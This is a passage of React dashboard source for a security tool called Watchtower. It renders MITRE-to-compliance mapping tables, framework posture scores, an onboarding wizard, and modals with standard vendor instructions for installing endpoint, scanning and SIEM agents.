                  }} style={{padding:'5px 14px',borderRadius:7,border:'1px solid #22d49a30',background:'#22d49a12',color:'#22d49a',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>
                    📊 Board Report PDF
                  </button>
                </div>
              </div>

              {/* Active technique coverage */}
              <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,overflow:'hidden'}}>
                <div style={{padding:'12px 16px',borderBottom:'1px solid var(--wt-border)',display:'flex',alignItems:'center',gap:8}}>
                  <span style={{fontSize:'0.86rem',fontWeight:800,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1px'}}>Active Threats by Framework</span>
                  <span style={{fontSize:'0.86rem',color:'var(--wt-muted)',marginLeft:'auto'}}>{alerts.filter(a=>a.mitre).length} alerts with MITRE mapping</span>
                </div>
                <div style={{overflowX:'auto'}}>
                  <table style={{width:'100%',borderCollapse:'collapse',fontSize:'0.82rem'}}>
                    <thead>
                      <tr style={{background:'var(--wt-card2)'}}>
                        {['MITRE Technique','Alert','Severity','ISO 27001','Cyber Essentials','NIST CSF'].map(h=>(
                          <th key={h} style={{padding:'8px 14px',textAlign:'left',fontWeight:700,fontSize:'0.86rem',color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',whiteSpace:'nowrap',borderBottom:'1px solid var(--wt-border)'}}>{h}</th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {alerts.filter(a=>a.mitre).length === 0 ? (
                        <tr><td colSpan={6} style={{padding:'24px',textAlign:'center',color:'var(--wt-dim)',fontSize:'0.86rem'}}>
                          {demoMode ? 'No MITRE-tagged alerts.' : 'No MITRE-tagged alerts from live tools yet — MITRE mappings populate as alerts arrive from CrowdStrike, Taegis, and Sentinel.'}
                        </td></tr>
                      ) : alerts.filter(a=>a.mitre).slice(0,12).map(a=>{
                        const mitreMap={
                          'T1003.001':{iso:'A.8.3 / A.8.5',ce:'Malware protection',nist:'DE.CM-1 / RS.AN-1'},
                          'T1071.001':{iso:'A.8.20 / A.8.23',ce:'Network firewalls',nist:'DE.CM-1 / PR.PT-4'},
                          'T1053.005':{iso:'A.8.8 / A.8.9',ce:'Secure configuration',nist:'DE.CM-3 / PR.IP-1'},
                          'T1059.001':{iso:'A.8.19 / A.8.9',ce:'Malware protection',nist:'PR.PT-3 / DE.CM-1'},
                          'T1078':{iso:'A.8.5 / A.9.2',ce:'Access control',nist:'PR.AC-1 / DE.CM-3'},
                          'T1567.002':{iso:'A.8.24 / A.6.8',ce:'Network firewalls',nist:'PR.DS-5 / DE.CM-1'},
                          'T1486':{iso:'A.8.7 / A.8.13',ce:'Malware protection',nist:'PR.IP-4 / RS.MI-1'},
                          'T1566.001':{iso:'A.8.23 / A.6.8',ce:'Malware protection',nist:'PR.AT-1 / DE.CM-1'},
                          'T1528':{iso:'A.8.2 / A.9.2',ce:'Access control',nist:'PR.AC-4 / DE.CM-7'},
                          'T1190':{iso:'A.8.8 / A.8.20',ce:'Patch management',nist:'PR.IP-12 / DE.CM-8'},
                          'T1055.002':{iso:'A.8.19 / A.8.16',ce:'Malware protection',nist:'DE.CM-4 / RS.AN-1'},
                        };
                        const m=mitreMap[a.mitre]||{iso:'A.8 / A.9',ce:'Access control',nist:'DE.CM-1'};
                        const sevColor=SEV_COLOR[a.severity];
                        return (
                          <tr key={a.id} className='row-hover' style={{borderBottom:'1px solid var(--wt-border)'}}>
                            <td style={{padding:'8px 14px',fontFamily:'JetBrains Mono,monospace',fontSize:'0.84rem',color:'#7c6aff',whiteSpace:'nowrap'}}>{a.mitre}</td>
                            <td style={{padding:'8px 14px',maxWidth:240,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{a.title}</td>
                            <td style={{padding:'8px 14px'}}><span style={{fontSize:'0.8rem',fontWeight:800,padding:'1px 6px',borderRadius:3,background:`${sevColor}15`,color:sevColor}}>{a.severity}</span></td>
                            <td style={{padding:'8px 14px',color:'var(--wt-secondary)',fontFamily:'JetBrains Mono,monospace',fontSize:'0.8rem',whiteSpace:'nowrap'}}>{m.iso}</td>
                            <td style={{padding:'8px 14px',color:'var(--wt-secondary)',fontSize:'0.84rem',whiteSpace:'nowrap'}}>{m.ce}</td>
                            <td style={{padding:'8px 14px',color:'var(--wt-secondary)',fontFamily:'JetBrains Mono,monospace',fontSize:'0.8rem',whiteSpace:'nowrap'}}>{m.nist}</td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Posture by framework — fetched from /api/compliance-map using live alert MITRE data */}
              {(()=>{
                const mitreTechs = alerts.filter(a=>a.mitre).map(a=>a.mitre);
                const uniqueTechs = [...new Set(mitreTechs)].join(',');
                // Framework scores are derived inline from alert MITRE data using the same mapping as the API
                const MITRE_FW = {'T1003.001':{iso:'A.8.3',ce:'Malware protection',nist:'DE'},'T1071.001':{iso:'A.8.20',ce:'Network firewalls',nist:'DE'},'T1053.005':{iso:'A.8.8',ce:'Secure configuration',nist:'DE'},'T1059.001':{iso:'A.8.19',ce:'Malware protection',nist:'PR'},'T1078':{iso:'A.8.5',ce:'Access control',nist:'PR'},'T1567.002':{iso:'A.8.24',ce:'Network firewalls',nist:'PR'},'T1486':{iso:'A.8.7',ce:'Malware protection',nist:'RS'},'T1566.001':{iso:'A.8.23',ce:'Malware protection',nist:'PR'},'T1528':{iso:'A.8.2',ce:'Access control',nist:'PR'},'T1190':{iso:'A.8.8',ce:'Patch management',nist:'PR'},'T1055.002':{iso:'A.8.19',ce:'Malware protection',nist:'DE'},'T1055':{iso:'A.8.19',ce:'Malware protection',nist:'DE'},'T1059':{iso:'A.8.9',ce:'Malware protection',nist:'PR'},'T1003':{iso:'A.8.5',ce:'Access control',nist:'PR'},'T1027':{iso:'A.8.16',ce:'Malware protection',nist:'DE'}};
                const isoFail=new Set(); const ceFail=new Set(); const nistFail=new Set();
                const NIST_FUNCS=['ID','PR','DE','RS','RC'];
                const CE_CONTROLS=['Firewalls','Secure configuration','Access control','Malware protection','Patch management'];
                const ISO_FAMILIES=['A.5','A.6','A.7','A.8','A.9','A.10'];
                mitreTechs.forEach(t=>{
                  const m=MITRE_FW[t]||MITRE_FW[t?.split('.')[0]];
                  if(!m) return;
                  isoFail.add(m.iso.split('.').slice(0,2).join('.'));
                  ceFail.add(m.ce);
                  nistFail.add(m.nist);
                });
                const isoScore = Math.max(0,Math.round(100-(isoFail.size/ISO_FAMILIES.length)*100));
                const ceScore  = Math.max(0,Math.round(100-(ceFail.size/CE_CONTROLS.length)*100));
                const nistScore= Math.max(0,Math.round(100-(nistFail.size/NIST_FUNCS.length)*100));
                const hasLiveData = !demoMode && mitreTechs.length > 0;
                const fws=[
                  {name:'ISO 27001',  score:hasLiveData?isoScore:74,  gaps:hasLiveData?[...isoFail].map(f=>`${f} control failing`):['A.8.8 Patch management','A.8.3 Config mgmt','A.17.1 Business continuity'],  color:'#4f8fff'},
                  {name:'Cyber Essentials', score:hasLiveData?ceScore:81,  gaps:hasLiveData?[...ceFail]:['Patch management','Network firewalls — VLAN isolation','MFA on all VPN users'],  color:'#22d49a'},
                  {name:'NIST CSF',   score:hasLiveData?nistScore:69, gaps:hasLiveData?[...nistFail].map(f=>`${f} function — alerts map here`):['DE.CM-4 Malware detection coverage','PR.IP-12 Vuln management','RS.CO-3 Escalation docs'], color:'#8b6fff'},
                ];
                return (
                  <div className='wt-three-col' style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:12}}>
                    {fws.map(fw=>(
                      <div key={fw.name} style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px'}}>
                        <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',marginBottom:12}}>
                          <span style={{fontSize:'0.8rem',fontWeight:800}}>{fw.name}</span>
                          <span style={{fontSize:'1.2rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:fw.color}}>{fw.score}<span style={{fontSize:'0.84rem',fontWeight:600,color:'var(--wt-muted)'}}>%</span></span>
                        </div>
                        <div style={{height:4,background:'var(--wt-border)',borderRadius:2,marginBottom:12}}>
                          <div style={{height:'100%',width:`${fw.score}%`,background:fw.color,borderRadius:2,transition:'width 1s'}} />
                        </div>
                        <div style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',marginBottom:6}}>{hasLiveData?`${fw.gaps.length} failing controls`:'Gaps to address (demo)'}</div>
                        {fw.gaps.slice(0,4).map(g=>(
                          <div key={g} style={{display:'flex',gap:6,marginBottom:4,alignItems:'flex-start'}}>
                            <span style={{color:'#f0405e',fontSize:'0.84rem',flexShrink:0,marginTop:2}}>✗</span>
                            <span style={{fontSize:'0.8rem',color:'var(--wt-secondary)',lineHeight:1.5}}>{g}</span>
                          </div>
                        ))}
                        {fw.gaps.length === 0 && <div style={{fontSize:'0.8rem',color:'#22d49a'}}>✓ No failing controls from current alerts</div>}
                      </div>
                    ))}
                  </div>
                );
              })()}

              {/* Vuln CVE → framework mapping */}
              <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px'}}>
                <div style={{fontSize:'0.86rem',fontWeight:800,color:'#f0a030',textTransform:'uppercase',letterSpacing:'1px',marginBottom:12}}>KEV Vulnerabilities — Compliance Impact</div>
                <div style={{display:'flex',flexDirection:'column',gap:8}}>
                  {vulns.filter(v=>v.kev).slice(0,5).map(v=>(
                    <div key={v.id} style={{display:'flex',alignItems:'center',gap:10,padding:'8px 10px',background:'var(--wt-card2)',borderRadius:8,flexWrap:'wrap'}}>
                      <span style={{fontSize:'0.84rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:'#f0405e',flexShrink:0}}>{v.cve}</span>
                      <span style={{fontSize:'0.8rem',flex:1,minWidth:160}}>{v.title}</span>
                      <div style={{display:'flex',gap:6,flexWrap:'wrap'}}>
                        <span style={{fontSize:'0.82rem',padding:'2px 7px',borderRadius:4,background:'#4f8fff14',color:'#4f8fff',border:'1px solid #4f8fff25'}}>ISO A.8.8</span>
                        <span style={{fontSize:'0.82rem',padding:'2px 7px',borderRadius:4,background:'#22d49a14',color:'#22d49a',border:'1px solid #22d49a25'}}>CE: Patching</span>
                        <span style={{fontSize:'0.82rem',padding:'2px 7px',borderRadius:4,background:'#8b6fff14',color:'#8b6fff',border:'1px solid #8b6fff25'}}>NIST PR.IP-12</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
            </GateWall>
          )}
          {/* ═══════════════════════════════ TOOLS ══════════════════════════════════ */}
          {activeTab==='tools' && (
            <ToolsTab connected={connectedTools} setConnected={setConnectedTools} toolSyncResults={toolSyncResults} doSync={doSync} syncingTool={syncingTool} demoMode={demoMode} syncLog={syncLog} userTier={userTier} isAdmin={isAdmin} />
          )}

          {/* ═══════════════════════════════ ADMIN PORTAL ═══════════════════════════════ */}
          {activeTab==='admin' && isAdmin && <AdminPortal setCurrentTenant={setCurrentTenantWithRef} setActiveTab={setActiveTab} clientBanner={clientBanner} setClientBanner={setClientBanner} adminBannerInput={adminBannerInput} setAdminBannerInput={setAdminBannerInput} userRole={userRole} setUserRole={setUserRole} currentTenant={currentTenant} />}

          {/* ═══════════════════════════════ MSSP PORTFOLIO ══════════════════════════ */}
          {activeTab==='mssp' && <MSSPPortfolio msspBranding={msspBranding} setMsspBranding={setMsspBranding} currentTenant={currentTenant} setCurrentTenant={setCurrentTenantWithRef} DEMO_TENANTS={DEMO_TENANTS} isAdmin={isAdmin} setActiveTab={setActiveTab} setAdminBannerInput={setAdminBannerInput} />}
          {activeTab==='sales' && isSales && <SalesDashboard />}
        </div>
      </div>

      {/* ═══════════════════════════════ MODALS ════════════════════════════════════ */}

      {/* Onboarding Wizard */}
      {showOnboarding&&(
        <div style={{position:'fixed',inset:0,background:'rgba(0,0,0,0.85)',zIndex:300,display:'flex',alignItems:'center',justifyContent:'center',padding:20}} onClick={()=>setShowOnboarding(false)}>
          <div style={{background:'var(--wt-card2)',border:'1px solid #4f8fff30',borderRadius:16,maxWidth:520,width:'100%',padding:28}} onClick={e=>e.stopPropagation()}>
            <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:20}}>
              <div style={{width:36,height:36,background:'linear-gradient(135deg,#4f8fff,#8b6fff)',borderRadius:9,display:'flex',alignItems:'center',justifyContent:'center',fontSize:'1.1rem'}}>🛡</div>
              <div>
                <div style={{fontSize:'0.92rem',fontWeight:800}}>Welcome to Watchtower</div>
                <div style={{fontSize:'0.84rem',color:'var(--wt-muted)'}}>3 steps to your first live alert</div>
              </div>
              <button onClick={()=>setShowOnboarding(false)} style={{marginLeft:'auto',background:'none',border:'none',color:'var(--wt-dim)',cursor:'pointer',fontSize:'1.2rem'}}>×</button>
            </div>
            <div style={{display:'flex',gap:4,marginBottom:24}}>
              {['Connect a tool','Configure AI','Go live'].map((s,i)=>(
                <div key={i} style={{flex:1,textAlign:'center'}}>
                  <div style={{height:4,borderRadius:2,background:i<=onboardingStep?'#4f8fff':'var(--wt-border)',marginBottom:4,transition:'background .3s'}} />
                  <div style={{fontSize:'0.84rem',color:i===onboardingStep?'#4f8fff':'var(--wt-dim)',fontWeight:i===onboardingStep?700:400}}>{s}</div>
                </div>
              ))}
            </div>
            {onboardingStep===0&&(
              <div>
                <div style={{fontSize:'0.82rem',fontWeight:700,marginBottom:8}}>Step 1 — Connect your first integration</div>
                <div style={{fontSize:'0.82rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:16}}>Watchtower connects to your existing tools — CrowdStrike, Tenable, Splunk, Sentinel, and 14 others. Click "+ Connect" on any tool to add your credentials.</div>
                <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:8,marginBottom:16}}>
                  {[{id:'crowdstrike',name:'CrowdStrike Falcon',cat:'EDR',color:'#f0405e'},{id:'tenable',name:'Tenable.io',cat:'Vuln',color:'#00b3e3'},{id:'splunk',name:'Splunk SIEM',cat:'SIEM',color:'#65a637'},{id:'sentinel',name:'Microsoft Sentinel',cat:'SIEM',color:'#4f8fff'}].map(t=>(
                    <div key={t.id} style={{padding:'10px 12px',background:'var(--wt-card)',border:`1px solid ${t.color}20`,borderRadius:8,display:'flex',alignItems:'center',gap:8}}>
                      <div style={{width:8,height:8,borderRadius:'50%',background:connectedTools[t.id]?'#22c992':'#252e42',flexShrink:0}} />
                      <div style={{flex:1}}>
                        <div style={{fontSize:'0.8rem',fontWeight:600}}>{t.name}</div>
                        <div style={{fontSize:'0.8rem',color:'var(--wt-dim)'}}>{t.cat}</div>
                      </div>
                    </div>
                  ))}
                </div>
                <div style={{display:'flex',gap:8}}>
                  <button onClick={()=>{setShowOnboarding(false);setActiveTab('tools');}} style={{flex:1,padding:'10px',borderRadius:8,border:'none',background:'#4f8fff',color:'#fff',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Go to Tools →</button>
                  {Object.keys(connectedTools).length>0&&<button onClick={()=>setOnboardingStep(1)} style={{padding:'10px 16px',borderRadius:8,border:'1px solid #22d49a30',background:'#22d49a10',color:'#22d49a',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Next ✓</button>}
                </div>
              </div>
            )}
            {onboardingStep===1&&(
              <div>
                <div style={{fontSize:'0.82rem',fontWeight:700,marginBottom:8}}>Step 2 — Add your Anthropic API key</div>
                <div style={{fontSize:'0.82rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:16}}>Watchtower uses Claude Haiku to triage alerts, generate attack narratives, and power the Co-Pilot. Add your own key to activate AI features.</div>
                <div style={{padding:'12px',background:'#4f8fff08',border:'1px solid #4f8fff20',borderRadius:8,fontSize:'0.8rem',color:'var(--wt-secondary)',marginBottom:16,lineHeight:1.6}}>Get a free key at <a href='https://console.anthropic.com/account/keys' target='_blank' rel='noopener noreferrer' style={{color:'#4f8fff'}}>console.anthropic.com</a> → API Keys → Create Key. It starts with <code style={{fontFamily:'JetBrains Mono,monospace',background:'var(--wt-border)',padding:'1px 4px',borderRadius:3}}>sk-ant-</code></div>
                <div style={{display:'flex',gap:8}}>
                  <button onClick={()=>setOnboardingStep(0)} style={{padding:'10px 16px',borderRadius:8,border:'1px solid var(--wt-border)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.82rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>← Back</button>
                  <button onClick={()=>{setShowOnboarding(false);setActiveTab('tools');}} style={{flex:1,padding:'10px',borderRadius:8,border:'none',background:'#4f8fff',color:'#fff',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Add in Tools tab →</button>
                  <button onClick={()=>setOnboardingStep(2)} style={{padding:'10px 16px',borderRadius:8,border:'1px solid #22d49a30',background:'#22d49a10',color:'#22d49a',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Skip</button>
                </div>
              </div>
            )}
            {onboardingStep===2&&(
              <div>
                <div style={{fontSize:'0.82rem',fontWeight:700,marginBottom:8}}>Step 3 — Switch to Live mode</div>
                <div style={{fontSize:'0.82rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:16}}>You're currently in Demo mode showing sample data. Click the DEMO toggle in the top bar to switch to Live and see your real alerts.</div>
                <div style={{padding:'12px 14px',background:'#22d49a08',border:'1px solid #22d49a20',borderRadius:8,marginBottom:16,display:'flex',alignItems:'center',gap:10}}>
                  <span style={{fontSize:'1.2rem'}}>✦</span>
                  <div style={{fontSize:'0.8rem',color:'var(--wt-secondary)',lineHeight:1.6}}>Watchtower will sync your tools every 60 seconds and start triaging alerts automatically.</div>
                </div>
                <div style={{display:'flex',gap:8}}>
                  <button onClick={()=>setOnboardingStep(1)} style={{padding:'10px 16px',borderRadius:8,border:'1px solid var(--wt-border)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.82rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>← Back</button>
                  <button onClick={()=>{setDemoMode(false);if(typeof window!=='undefined')localStorage.setItem('wt_demo_mode','false');setShowOnboarding(false);}} style={{flex:1,padding:'10px',borderRadius:8,border:'none',background:'#22d49a',color:'#fff',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Go Live! →</button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Deploy Agent Modal */}
      {deployAgentDevice && (()=>{
        const TOOL_INSTRUCTIONS = {
          'CrowdStrike Falcon': {
            color:'#f0405e',
            steps:[
              {label:'1. Download sensor installer',detail:`Log into Falcon console → Host Setup → Sensor Downloads. Select installer for ${deployAgentDevice.os?.includes('mac')?'macOS':deployAgentDevice.os?.includes('Linux')||deployAgentDevice.os?.includes('NAS')?'Linux':'Windows'}.`},
              {label:'2. Run with your CID',detail:'Windows: `CsInstaller.exe /install /quiet CID=<your-CID>` — requires local admin.\nmacOS: `sudo installer -pkg falcon-sensor.pkg -target /`\nLinux: `rpm -ivh falcon-sensor.rpm` then `/opt/CrowdStrike/falconctl -s --cid=<your-CID>`'},
              {label:'3. Verify check-in',detail:'Falcon console → Hosts → search for hostname. Sensor version and last-seen will appear within 5 minutes of install.'},
            ],
            note:'Legacy OS / IoT note: CrowdStrike Falcon requires Windows 7 SP1+ / macOS 10.15+ / RHEL 6+. For older or restricted devices, consider Falcon Go or a network-level sensor.'
          },
          'Tenable.io': {
            color:'#00b3e3',
            steps:[
              {label:'1. Create a scanner link key',detail:'Tenable.io → Settings → Sensors → Nessus Agents → Add Agent. Copy the linking key.'},
              {label:'2. Install the Nessus Agent',detail:'Windows: `NessusAgent.msi NESSUS_SERVER=cloud.tenable.com:443 NESSUS_KEY=<key>`\nmacOS: Install .dmg, then `/Library/NessusAgent/run/sbin/nessuscli agent link --key=<key> --cloud`\nLinux: `dpkg -i NessusAgent.deb && /opt/nessus_agent/sbin/nessuscli agent link --key=<key> --cloud`'},
              {label:'3. Assign to a scan group',detail:'Tenable.io → Sensors → Nessus Agents → assign to the relevant agent group for automatic scanning.'},
            ],
            note:'NAS / IoT note: Nessus Agent requires a general-purpose OS with exec support. For FreeNAS or IoT devices, use an unauthenticated network scan from a Nessus scanner instead.'
          },
          'Splunk SIEM': {
            color:'#65a637',
            steps:[
              {label:'1. Download the Universal Forwarder',detail:'Splunk downloads page → Universal Forwarder → select architecture. Use the version matching your Splunk Enterprise/Cloud version.'},
              {label:'2. Install and configure',detail:'Windows: `msiexec.exe /i splunkforwarder.msi SPLUNK_SERVER=<your-splunk>:9997 /quiet`\nLinux: `tar -xvzf splunkforwarder.tgz -C /opt && /opt/splunkforwarder/bin/splunk start --accept-license --answer-yes`\nThen: `./splunk add forward-server <splunk-host>:9997`'},
              {label:'3. Configure inputs',detail:'Add inputs.conf to monitor relevant logs: Windows Event Log, syslog, or application logs depending on device role. Use Splunk Add-ons for structured data sources.'},
            ],
            note:'NAS note: Splunk UF is not supported on FreeNAS/TrueNAS directly. Instead, configure syslog forwarding from the NAS to a Splunk syslog listener on port 514.'
          },
          'Microsoft Defender': {
            color:'#00a4ef',
            steps:[
              {label:'1. Onboard via Intune or Group Policy',detail:'Microsoft 365 Defender → Settings → Endpoints → Onboarding. Select deployment method: Intune, SCCM, Group Policy, or Local Script.'},
              {label:'2. Run the onboarding script',detail:'Download WindowsDefenderATPOnboardingPackage.zip. Extract and run `WindowsDefenderATPLocalOnboardingScript.cmd` as Administrator on the target device.'},
              {label:'3. Verify onboarding',detail:'Defender portal → Devices → search for hostname. Device should appear within 5–10 minutes with onboarding status "Onboarded".'},
            ],
            note:'IoT / Windows 10 IoT note: Defender for Endpoint requires Windows 10 Enterprise or Windows Server 2016+. Windows 10 IoT is not fully supported — consider network-based detection via Defender for IoT (OT sensor) instead.'
          },
        };
        const missing = deployAgentDevice.missing || [];
        return (
          <Modal title={`Deploy Agents — ${deployAgentDevice.hostname}`} onClose={()=>setDeployAgentDevice(null)}>
            <div style={{marginBottom:14,padding:'8px 12px',background:'var(--wt-card2)',border:'1px solid var(--wt-border)',borderRadius:8}}>
              <div style={{fontSize:'0.84rem',color:'var(--wt-muted)',marginBottom:3}}>Device: <strong style={{color:'var(--wt-text)',fontFamily:'JetBrains Mono,monospace'}}>{deployAgentDevice.hostname}</strong> · {deployAgentDevice.os} · {deployAgentDevice.ip}</div>
              <div style={{fontSize:'0.84rem',color:'#f0405e'}}>⚠ {deployAgentDevice.reason}</div>
            </div>
            {missing.map(tool=>{
              const info = TOOL_INSTRUCTIONS[tool] || {color:'#4f8fff',steps:[{label:'Manual deployment required',detail:`Visit the ${tool} admin console and follow the agent deployment guide for ${deployAgentDevice.os}.`}],note:null};
              return (
                <div key={tool} style={{marginBottom:12,border:`1px solid ${info.color}25`,borderRadius:10,overflow:'hidden'}}>
                  <div style={{padding:'9px 14px',background:`${info.color}0f`,borderBottom:`1px solid ${info.color}20`,display:'flex',alignItems:'center',gap:8}}>
                    <span style={{width:8,height:8,borderRadius:'50%',background:info.color,display:'block',flexShrink:0}} />
                    <span style={{fontSize:'0.8rem',fontWeight:800,color:info.color}}>{tool}</span>
                    <span style={{marginLeft:'auto',fontSize:'0.82rem',color:'var(--wt-dim)',fontWeight:600}}>{missing.indexOf(tool)+1}/{missing.length}</span>
                  </div>
                  <div style={{padding:'10px 14px',display:'flex',flexDirection:'column',gap:8}}>
                    {info.steps.map(step=>(
                      <div key={step.label} style={{display:'flex',gap:10,alignItems:'flex-start'}}>
                        <div style={{width:18,height:18,borderRadius:4,background:`${info.color}18`,border:`1px solid ${info.color}30`,display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.84rem',fontWeight:800,color:info.color,flexShrink:0,marginTop:1}}>{info.steps.indexOf(step)+1}</div>
                        <div style={{flex:1}}>
                          <div style={{fontSize:'0.8rem',fontWeight:700,marginBottom:2}}>{step.label}</div>
                          <div style={{fontSize:'0.82rem',color:'var(--wt-muted)',lineHeight:1.65,fontFamily:'JetBrains Mono,monospace',background:'var(--wt-card2)',padding:'5px 8px',borderRadius:5,whiteSpace:'pre-wrap',wordBreak:'break-all'}}>{step.detail}</div>
                        </div>
                      </div>
                    ))}
                    {info.note && (
                      <div style={{padding:'6px 10px',background:'#f0a03009',border:'1px solid #f0a03022',borderRadius:6,fontSize:'0.63rem',color:'#f0a030',lineHeight:1.55}}>
                        ⚠ {info.note}
                      </div>
                    )}
                  </div>
                </div>
              );
            })}
            <div style={{padding:'8px 12px',background:'var(--wt-card2)',border:'1px solid #4f8fff15',borderRadius:7,fontSize:'0.82rem',color:'var(--wt-muted)',lineHeight:1.6}}>
              💡 After deployment, agents check in within 5 minutes. This device will clear from the gaps list automatically once all agents are reporting.
            </div>
          </Modal>
        );
      })()}

      {/* Coverage Gap Modal */}
      {modal?.type==='gaps' && (
        <Modal title={`Coverage Gaps — ${gapDevices.length} Devices`} onClose={()=>setModal(null)}>
          <div style={{marginBottom:10,padding:'8px 12px',background:'#f0405e0a',border:'1px solid #f0405e18',borderRadius:8,fontSize:'0.82rem',color:'#f0405e'}}>
            ⚠ These devices have no agent coverage — they are invisible to your security tools and represent active risk.
          </div>
          {Object.keys(osBreakdown||{}).length > 0 && (
            <div style={{display:'flex',gap:6,flexWrap:'wrap',marginBottom:12}}>
              {Object.entries(osBreakdown||{}).sort((a,b)=>b[1]-a[1]).map(([os,n])=>(
                <span key={os} style={{fontSize:'0.86rem',padding:'3px 9px',borderRadius:5,background:'var(--wt-card2)',border:'1px solid var(--wt-border)',color:'var(--wt-secondary)',fontFamily:'JetBrains Mono,monospace'}}>{os} <strong style={{color:'var(--wt-text)'}}>{n}</strong></span>
              ))}
              <span style={{fontSize:'0.86rem',color:'var(--wt-dim)',alignSelf:'center'}}>by OS</span>
            </div>
          )}
          {gapDevices.map(dev=>(
            <div key={dev.hostname} style={{padding:'12px 0',borderBottom:'1px solid #1d2535',cursor:'pointer'}} onClick={()=>{setModal(null);setDeployAgentDevice(dev);}}>

              <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:4}}>
                <span style={{fontSize:'0.82rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace'}}>{dev.hostname}</span>
                <span style={{fontSize:'0.84rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{dev.ip}</span>
                <span style={{fontSize:'0.84rem',color:'var(--wt-muted)'}}>{dev.os}</span>
                <span style={{fontSize:'0.82rem',color:'var(--wt-dim)',marginLeft:'auto'}}>Last seen {dev.lastSeen}</span>
              </div>
              <div style={{display:'flex',gap:5,flexWrap:'wrap',marginBottom:4}}>
                {dev.missing.map(m=>{
                  const catColor = m.includes('Falcon')||m.includes('Defender')||m.includes('SentinelOne')||m.includes('Carbon Black')?'#f0405e':m.includes('Splunk')||m.includes('Sentinel')||m.includes('QRadar')||m.includes('Elastic')?'#f0a030':m.includes('Tenable')||m.includes('Nessus')||m.includes('Qualys')?'#8b6fff':'#4f8fff';
                  return <span key={m} style={{fontSize:'0.86rem',fontWeight:700,padding:'3px 8px',borderRadius:4,background:`${catColor}14`,color:catColor,border:`1px solid ${catColor}28`,display:'inline-flex',alignItems:'center',gap:4}}><span style={{fontSize:'0.84rem'}}>✗</span>{m}</span>;
                })}
              </div>
              <div style={{fontSize:'0.84rem',color:'var(--wt-muted)'}}>{dev.reason}</div>
            </div>
          ))}
        </Modal>
      )}

      {/* Tools Modal */}
      {modal?.type==='tools' && (
        <Modal title='Tool Status & Sync' onClose={()=>setModal(null)}>
          <div style={{marginBottom:12,fontSize:'0.82rem',color:'var(--wt-muted)'}}>Last synced: {lastSynced ? new Date(lastSynced).toLocaleTimeString('en-GB') : 'Not yet'} · {Object.keys(connectedTools).length} tools connected</div>
          {tools.filter(t=>t.active||connectedTools[t.id]).map(tool=>{
            const sr = toolSyncResults[tool.id];
            return (
              <div key={tool.id} style={{padding:'10px 0',borderBottom:'1px solid #1d2535'}}>
                <div style={{display:'flex',alignItems:'center',gap:10}}>
                  <div style={{width:8,height:8,borderRadius:'50%',background:sr?.error?'#f0405e':sr?'#22c992':'#f0a030',boxShadow:sr?.error?'0 0 5px #f0405e':sr?'0 0 5px #22c992':'none',flexShrink:0}} />
                  <span style={{flex:1,fontSize:'0.82rem',fontWeight:600}}>{tool.name}</span>
                  <span style={{fontSize:'0.82rem',color:sr?.error?'#f0405e':sr?'#22d49a':'#f0a030',fontWeight:700}}>
                    {sr?.error ? '✗ Error' : sr ? `✓ ${sr.count} records` : 'Pending'}
                  </span>
                  {!demoMode && doSync && <button onClick={()=>doSync([tool.id])} style={{padding:'2px 8px',borderRadius:4,border:'1px solid #4f8fff28',background:'#4f8fff0a',color:'#4f8fff',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>⟳</button>}
                </div>
                {sr && <div style={{paddingLeft:18,marginTop:4,fontSize:'0.84rem',color:sr.error?'#f0405e':'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace',lineHeight:1.5}}>
                  {sr.error ? sr.error : `Last sync: ${new Date(sr.syncedAt).toLocaleTimeString('en-GB')} · ${sr.count} record${sr.count!==1?'s':''} pulled`}
                </div>}
              </div>
            );
          })}
          {tools.filter(t=>!t.active&&!connectedTools[t.id]).length > 0 && (
            <div style={{marginTop:10,padding:'8px 10px',background:'var(--wt-card2)',borderRadius:7,fontSize:'0.82rem',color:'var(--wt-dim)'}}>
